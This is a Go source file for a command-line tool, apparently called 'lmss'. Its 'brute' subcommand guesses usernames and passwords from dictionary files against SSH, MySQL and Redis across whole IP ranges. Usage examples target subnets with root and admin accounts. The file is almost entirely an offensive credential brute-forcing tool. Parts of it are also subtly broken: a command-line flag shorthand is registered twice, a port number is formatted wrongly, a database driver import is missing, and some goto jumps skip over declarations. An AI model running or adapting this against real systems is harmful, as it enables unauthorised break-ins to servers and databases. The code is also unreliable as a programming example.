package cmd

import (
	"bufio"
	"context"
	"database/sql"
	"fmt"
	"lmss/pkg/log"
	"os"
	"time"

	"github.com/go-redis/redis/v8"
	"github.com/spf13/cobra"
	"golang.org/x/crypto/ssh"
)

var (
	targetPort    int
	unameDictPath string
	pwdDictPath   string
	unames        []string
	pwds          []string
)
var bruteCmd = cobra.Command{
	Use:   "brute",
	Short: "Bruteforce service",
	Args:  cobra.MinimumNArgs(1),
	Long: "Bruteforce target service by dict.\n " +
		"Usage:\n" +
		"lmss brute ssh -H 192.168.1.1/24,192.168.1.1 -P 22 --ud path/to/username_dict.txt --pd path/to/password_dict.txt\n" +
		"lmss brute ssh -H 192.168.1.1/24,192.168.1.1 -P 22 --uname root,admin -p 123456,666666,root",
	Run: func(cmd *cobra.Command, args []string) {
		switch args[0] {
		case "ssh":
			if targetPort == 0 {
				targetPort = 22
			}
			for ip := range hosts {
				for _, uname := range unames {
					for _, pwd := range pwds {
						tp.Start(func() {
							//var session *ssh.Session
							config := &ssh.ClientConfig{
								User: uname,
								Auth: []ssh.AuthMethod{
									ssh.Password(pwd),
								},
								HostKeyCallback: ssh.InsecureIgnoreHostKey(),
								Timeout:         time.Duration(timeout) * time.Second,
							}
							client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", ip, targetPort), config)
							if err != nil {
								log.Error(fmt.Sprintf("failed: %s/%s", uname, pwd))
								goto end
							}
							log.Success(fmt.Sprintf("connected of %s/%s", uname, pwd))
							//log.Success("please wait for a while......")
							defer client.Close()
							//session, err = client.NewSession()
							//if err != nil {
							//	log.Error(fmt.Sprintf("创建SSH会话失败: %v", err))
							//	goto end
							//}
							//defer session.Close()
							// 执行简单命令测试连接
							//err = session.Run("echo 'SSH连接成功!'")
							//if err != nil {
							//	return fmt.Errorf("SSH命令执行失败: %v", err)
							//}
						end:
						})
					}
				}
			}
			break
		case "mysql":
			if targetPort == 0 {
				targetPort = 3306
			}
			for host := range hosts {
				for _, uname := range unames {
					for _, pwd := range pwds {
						tp.Start(func() {
							var ctx context.Context
							var cancel context.CancelFunc
							dsn := fmt.Sprintf("%s:%s@tcp(%s:%s)?charset=utf8mb4&parseTime=True&loc=Local",
								uname, pwd, host, targetPort)
							db, err := sql.Open("mysql", dsn)
							if err != nil {
								log.Error(fmt.Sprintf("failed: %s/%s", uname, pwd))
								goto end
							}
							defer db.Close()
							log.Success(fmt.Sprintf("connected of %s/%s", uname, pwd))
							//db.SetMaxOpenConns(10)
							//db.SetMaxIdleConns(5)
							//db.SetConnMaxLifetime(5 * time.Minute)
							ctx, cancel = context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
							defer cancel()
							err = db.PingContext(ctx)
							if err != nil {
								log.Error(fmt.Sprintf("but ping error: %v", err))
							}
						end:
						})
					}
				}
			}
			break
		case "redis":
			if targetPort == 0 {
				targetPort = 6379
			}
			for host := range hosts {
				for _, pwd := range pwds {
					tp.Start(func() {
						rdb := redis.NewClient(&redis.Options{
							Addr:     fmt.Sprintf("%s:%d", host, targetPort),
							Password: pwd,
							DB:       0,
						})

						ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
						defer cancel()

						// 测试连接
						_, err := rdb.Ping(ctx).Result()
						if err != nil {
							log.Error(fmt.Sprintf("failed: %s", pwd))
						}
					})
				}
			}
			break
		default:
			cmd.Usage()
		}
		tp.Stop()
	},
	PreRun: func(cmd *cobra.Command, args []string) {
		var (
			err     error
			file    *os.File
			scanner *bufio.Scanner
		)
		if unameDictPath != "" {
			file, err = os.Open(unameDictPath)
			if err != nil {
				log.Error(fmt.Sprintf("open file error: %v", err))
				os.Exit(1)
			}
			scanner = bufio.NewScanner(file)
			for scanner.Scan() {
				unames = append(unames, scanner.Text())
			}
			file.Close()
		}
		if pwdDictPath != "" {
			file, err = os.Open(pwdDictPath)
			if err != nil {
				log.Error(fmt.Sprintf("open file error: %v", err))
				os.Exit(1)
			}
			defer file.Close()
			scanner = bufio.NewScanner(file)
			for scanner.Scan() {
				pwds = append(pwds, scanner.Text())
			}
		}
	},
}

func init() {
	RootCmd.AddCommand(&bruteCmd)
	bruteCmd.Flags().IntVarP(&targetPort, "targetPorts", "p", 0, "-p 22")
	bruteCmd.Flags().StringVar(&unameDictPath, "ud", "", "-ud /path/to/username_dict.txt")
	bruteCmd.Flags().StringVar(&pwdDictPath, "pd", "", "-pd  /path/to/password_dict.txt")
	bruteCmd.Flags().StringSliceVarP(&unames, "uname", "u", nil, "-u root")
	bruteCmd.Flags().StringSliceVarP(&pwds, "pwd", "p", nil, "-p root")
}
